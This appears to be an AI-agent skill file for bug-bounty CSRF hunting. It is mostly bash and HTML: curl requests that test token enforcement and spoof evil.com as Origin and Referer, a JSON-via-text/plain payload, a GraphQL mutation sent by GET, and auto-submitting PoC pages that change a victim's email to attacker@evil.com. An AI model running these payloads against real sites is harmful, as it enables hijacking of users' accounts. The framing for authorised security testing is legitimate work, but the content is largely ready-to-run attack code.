---
name: k1nzr3c0n-hunt-csrf
description: "CSRF hunting skill built from 15 disclosed bug bounty reports. Covers SameSite bypass (CVE-2024-22424), GraphQL mutations-via-GET, JSON CSRF via text/plain, path-traversal CSRF bypass (CVE-2022-23732), Duende BFF attack classes. SameSite=Lax does NOT protect GET-based state changes."
tags: [csrf, hunt, web-security, bug-bounty]
report_count: 15
---

# K1NZR3C0N Hunt — CSRF

> **Logout CSRF alone is in the never-submit list** — session already invalidated.
> **SameSite=Strict ≠ safe**: check if request goes cross-site via POST or sub-path.
> **Body-Diff Rule**: CSRF bypass needs body change (state changed), not just 200 OK.

---

## Crown Jewels

```
Priority 1 — State-change on high-value action: email change, password change, payment, 2FA disable
Priority 2 — GraphQL mutation via GET (no CSRF token needed — GETs are usually unprotected)
Priority 3 — JSON CSRF via Content-Type: text/plain (no preflight)
Priority 4 — SameSite bypass via GET-based state-change or subdomain same-site
Priority 5 — Token fixation: CSRF token in URL (referrer leak)
```

---

## Phase 0 — Bootstrap

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_csrf_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

echo "=== CSRF Candidate Endpoints ==="
RUNS_BASE="/app/runs"
# State-changing endpoints
grep -rhoP 'https?://[^\s"]+(?:change|update|modify|delete|remove|add|create|transfer|send|reset|disable|enable|revoke|confirm|verify|submit)' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/csrf_candidates.txt" | head -20
```

## Phase 1 — Token Validation Check

```bash
echo "=== CSRF Token Validation ==="
STATE_EP="${CSRF_ENDPOINT:-https://${TARGET}/api/user/email}"

# 1. Get legit token from form
echo "Step 1: Find CSRF token in form/response headers:"
RESP=$(curl -sk "https://${TARGET}/settings" -H "Cookie: ${SESSION_COOKIE:-}")
CSRF_TOKEN=$(echo "$RESP" | grep -oP '(?:csrf[_-]?token|_token|authenticity_token|csrf)["\s:=]+["\x27]([^"\x27\s]+)' | head -1 | grep -oP '[^"\x27=]+$')
echo "  Found token: $CSRF_TOKEN"

# 2. Test with missing token
echo "Step 2: Request WITHOUT token:"
RESP1=$(curl -sk -X POST "$STATE_EP" \
  -H "Cookie: ${SESSION_COOKIE:-}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=attacker@evil.com")
echo "  Response: ${RESP1:0:100}"

# 3. Test with invalid token
echo "Step 3: Request with INVALID token:"
RESP2=$(curl -sk -X POST "$STATE_EP" \
  -H "Cookie: ${SESSION_COOKIE:-}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=attacker@evil.com&csrf_token=invalidtoken123")
echo "  Response: ${RESP2:0:100}"

# Body-diff: if same success response without token → CSRF vulnerable
[ "$RESP1" = "$RESP2" ] && \
  echo "  [SAME RESPONSE] Token missing vs invalid → CSRF protection not enforced"
```

## Phase 2 — SameSite & Header-Only Checks

```bash
echo "=== SameSite Cookie Analysis ==="
COOKIE_HEADER=$(curl -skI "https://${TARGET}/login" | grep -i 'set-cookie')
echo "$COOKIE_HEADER" | grep -i 'samesite' | sed 's/^/  /'

echo "$COOKIE_HEADER" | grep -qi 'samesite=strict' && echo "  [STRICT] SameSite=Strict — CSRF very hard"
echo "$COOKIE_HEADER" | grep -qi 'samesite=lax'   && echo "  [LAX] SameSite=Lax — GET requests still vulnerable"
echo "$COOKIE_HEADER" | grep -qiE 'samesite=none'  && echo "  [NONE] SameSite=None — classic CSRF likely"
echo "$COOKIE_HEADER" | grep -qiEv 'samesite'      && echo "  [MISSING] No SameSite — classic CSRF"

echo ""
echo "=== Referer/Origin Header Validation ==="
# Does the server check Origin/Referer? Remove them and test
curl -sk -X POST "$STATE_EP" \
  -H "Cookie: ${SESSION_COOKIE:-}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: https://evil.com" \
  -H "Referer: https://evil.com/csrf.html" \
  -d "email=attacker@evil.com" | head -5
```

## Phase 3 — JSON CSRF via text/plain

```bash
echo "=== JSON CSRF via text/plain ==="
# If endpoint accepts JSON but no CSRF token — test with text/plain to skip preflight
STATE_EP="${CSRF_ENDPOINT:-https://${TARGET}/api/user/email}"

# JSON body via text/plain (no CORS preflight for text/plain)
curl -sk -X POST "$STATE_EP" \
  -H "Cookie: ${SESSION_COOKIE:-}" \
  -H "Content-Type: text/plain" \
  -d '{"email": "attacker@evil.com"}' | head -5

echo ""
echo "CSRF PoC HTML (text/plain JSON body):"
cat << 'HTML'
<form action="https://TARGET/api/user/email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","_":"' value='"}'>
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>
HTML
```

## Phase 4 — GraphQL Mutation via GET

```bash
echo "=== GraphQL CSRF via GET ==="
GQL_EP="https://${TARGET}/graphql"

# GraphQL mutations via GET bypass CSRF (GET requests not protected by SameSite=Lax for mutations)
MUTATION="mutation{updateEmail(email:\"attacker@evil.com\"){success}}"
ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$MUTATION")

RESP=$(curl -sk "${GQL_EP}?query=${ENCODED}" \
  -H "Cookie: ${SESSION_COOKIE:-}")
echo "$RESP" | python3 -m json.tool 2>/dev/null | head -10

echo ""
echo "GraphQL CSRF via GET PoC:"
echo "  <img src='${GQL_EP}?query=${ENCODED}'>"
```

## Phase 5 — CSRF PoC HTML Template

```bash
cat << 'HTML'
<!DOCTYPE html>
<html>
<body>
<h1>CSRF PoC</h1>
<!-- Traditional form-based CSRF -->
<form id="csrf" action="https://TARGET/api/settings/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- Or fetch-based (same-origin only — test if CORS allows it) -->
<script>
fetch('https://TARGET/api/settings/email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=attacker@evil.com'
});
</script>
</body>
</html>
HTML
```

## Phase 6 — Gate 0

```bash
echo "=== CSRF Gate 0 ==="
echo "  □ State actually CHANGED server-side (not just 200 OK)"
echo "  □ Action is sensitive: email/password/2FA change, payment, account delete"
echo "  □ Request works WITHOUT valid CSRF token"
echo "  □ Request works with a DIFFERENT ORIGIN header"
echo "  □ PoC HTML page actually triggers the action in browser"
echo "  □ NOT logout CSRF alone (already in never-submit list)"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
CSRF on [/api/user/email] allows attacker to change victim's email address — no CSRF token validation
GraphQL mutation via GET on [/graphql] bypasses SameSite=Lax protection, enabling cross-site account modifications
JSON CSRF in [/api/settings] via text/plain Content-Type bypasses CORS preflight, allowing unauthenticated state change
```
